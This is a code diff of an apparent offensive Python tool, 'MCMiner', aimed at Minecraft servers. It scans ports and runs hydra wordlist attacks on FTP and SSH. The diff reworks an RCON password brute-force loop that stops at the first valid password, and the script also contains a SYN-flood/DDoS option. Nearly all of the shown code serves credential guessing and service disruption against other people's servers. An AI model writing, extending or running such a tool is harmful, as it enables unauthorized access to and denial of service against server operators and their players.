@@ -6,6 +6,7 @@ import mechanize
 import string
 from scapy.layers.inet import TCP, IP
 from mcrcon import MCRcon
+import linecache
 
 Fore.LR = Fore.LIGHTRED_EX
 Fore.LG = Fore.LIGHTGREEN_EX
@@ -38,7 +39,6 @@ FTP = False
 SSH = False
 Website = False
 Server = False
-RCON = False
 
 os.system('title MCMiner by wfsec')
 print(f'''
@@ -60,9 +60,9 @@ PORTS = {21: 'FTP',  # Ports to scan
          443: 'HTTPS',
          3389: 'RDP',
          8080: 'ALT HTTP',
+         8192: 'Dynmap',
          19132: 'Bedrock',
-         25565: 'JavaServer',
-         25575: 'RCON'}
+         25565: 'JavaServer'}
 
 
 def syn_flood(dst_ip: str, dst_port: int):
@@ -111,8 +111,6 @@ for port in PORTS:
             Website = True
         if port == 25565:
             Server = True
-        if port == 25575:
-            RCON = True
         print(f'{Fore.LG}       [+]{Fore.W} Port {port} is open on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
         s.close()
 
@@ -271,12 +269,16 @@ if Website:
         for res in r.history:
             print(f'            {Fore.LB}[{r.status_code}]{Fore.W} Redirected to{Fore.LWEX} {res.url}')
 
-        d = requests.head(f'http://{ip}', headers=user_agent)
-        print(f'''
-                {Fore.LB}Server:{Fore.W} {d.headers["server"]}
-                {Fore.LB}Content type:{Fore.W} {d.headers["content-type"]}
-        ''')
-        print('')
+        try:
+            d = requests.head(f'http://{ip}', headers=user_agent)
+            print(f'''
+                    {Fore.LB}Server:{Fore.W} {d.headers["server"]}
+                    {Fore.LB}Content type:{Fore.W} {d.headers["content-type"]}
+            ''')
+            print('')
+        except KeyError:
+            print(f'                    {Fore.LR}[!]{Fore.W} Cant get information about website!')
+            pass
 
         fuzzask = input('            Do you want to fuzz the site? y/n: ')
         if fuzzask == 'y':
@@ -284,11 +286,9 @@ if Website:
 
         else:
             print('               Ok.')
-            print('')
 
     else:
         print('               Ok.')
-        print('')
 
 if FTP:
     print('')
@@ -302,12 +302,11 @@ if FTP:
         os.system(f'hydra -L {ftp_username_wordlist} -P {ftp_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
 
     else:
-        print('''               Ok.
-                    ''')
+        print('''               Ok.''')
 
 if SSH:
     print('')
-    SSHASK = input('             Do you want to Wordlist attack on SSH? y/n: ')
+    SSHASK = input('            Do you want to Wordlist attack on SSH? y/n: ')
 
     if SSHASK == 'y':
         the_proto = 'ssh'
@@ -317,21 +316,34 @@ if SSH:
         os.system(f'hydra -L {ssh_username_wordlist} -P {ssh_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
 
     else:
-        print('''               Ok.
-                    ''')
+        print('''               Ok.''')
 
-if RCON:
-    if Server:
-        count = 0
+if Server:
+    print('')
+    rcon_attack = input('            Do you want to Wordlist attack RCON? y/n: ')
+    if rcon_attack == 'y':
+        count = 1
+
         f = open('rcon_passwords.txt')
         amount_lines = len(f.readlines())
         line = f.readlines()
         while count < amount_lines:
-            password = line[count]
-            print(f'                    {Fore.Y}[*]{Fore.W} Trying {Fore.LB}[{ip}:{password}]{Fore.W}')
-            mcr = MCRcon(ip, password)
-            resp = mcr.command("/say SERVER HACKER!D!!!!!!")
-            print(resp)
+            password = linecache.getline(r'rcon_passwords.txt', count)
+            print(f'                    {Fore.Y}[*]{Fore.W} Trying {Fore.LB}{ip}:{password}{Fore.W}')
+            try:
+                with MCRcon(ip, password, 25575, timeout=30) as mcr:
+                    print(f'                    {Fore.LG}[+]{Fore.W} Valid {Fore.LB}{ip}:{password}{Fore.W}')
+                    mcr.disconnect()
+                    break
+            except TimeoutError:
+                print(f'                    {Fore.RED}[!]{Fore.W} Invalid {Fore.LB}{ip}:{password}{Fore.W}')
+            except ConnectionRefusedError:
+                print(f'                    {Fore.RED}[!]{Fore.W}{ip}{Fore.RED} Refused Connection{Fore.W}')
+                break
+            except KeyboardInterrupt:
+                print(f'                    {Fore.RED}Interrupted{Fore.W}')
+                break
+            count += 1
 
     else:
         print(f'                 {Fore.LR}[!]{Fore.W} No RCON Running on port 25575')
@@ -345,4 +357,3 @@ if ddos_ask == 'y':
 
 else:
     print('               Ok.')
-    print('')
